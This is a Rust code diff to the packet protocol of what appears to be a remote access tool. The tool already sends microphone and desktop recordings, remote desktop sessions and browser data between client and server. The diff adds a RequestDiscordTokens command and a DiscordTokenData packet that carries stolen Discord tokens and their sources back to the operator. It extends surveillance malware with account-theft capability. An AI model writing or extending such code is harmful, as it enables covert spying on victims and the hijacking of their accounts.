@@ -39,6 +39,7 @@ pub enum ServerboundPacket {
     MicRecordingFile(FileData),
     DesktopRecordingPreviewFrame(DesktopRecordingPreviewFrame),
     DesktopRecordingFile(FileData),
+    DiscordTokenData(DiscordTokenData),
     BrowserData(BrowserData),
 }
 
@@ -77,6 +78,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::MicRecordingFile(_) => "Mic Recording File",
             ServerboundPacket::DesktopRecordingPreviewFrame(_) => "Desktop Recording Preview Frame",
             ServerboundPacket::DesktopRecordingFile(_) => "Desktop Recording File",
+            ServerboundPacket::DiscordTokenData(_) => "Discord Token Data",
             ServerboundPacket::BrowserData(_) => "Browser Data",
         }
     }
@@ -96,6 +98,7 @@ pub enum ClientboundPacket {
     StartRemoteDesktop(RemoteDesktopConfig),
     StopRemoteDesktop,
     RequestMicDevices,
+    RequestDiscordTokens,
     StartMicLive(String),
     StopMicLive,
     StartMicRecording(String),
@@ -175,6 +178,7 @@ impl Packet for ClientboundPacket {
                     ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
             ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
             ClientboundPacket::RequestMicDevices => "Request Mic Devices",
+            ClientboundPacket::RequestDiscordTokens => "Request Discord Tokens",
             ClientboundPacket::StartMicLive(_) => "Start Mic Live",
             ClientboundPacket::StopMicLive => "Stop Mic Live",
             ClientboundPacket::StartMicRecording(_) => "Start Mic Recording",
@@ -237,6 +241,17 @@ pub struct MicAudioChunk {
     pub sample_rate: u32,
     pub channels: u16,
     pub data: Vec<u8>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct DiscordTokenInfo {
+    pub source: String,
+    pub token: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct DiscordTokenData {
+    pub tokens: Vec<DiscordTokenInfo>,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
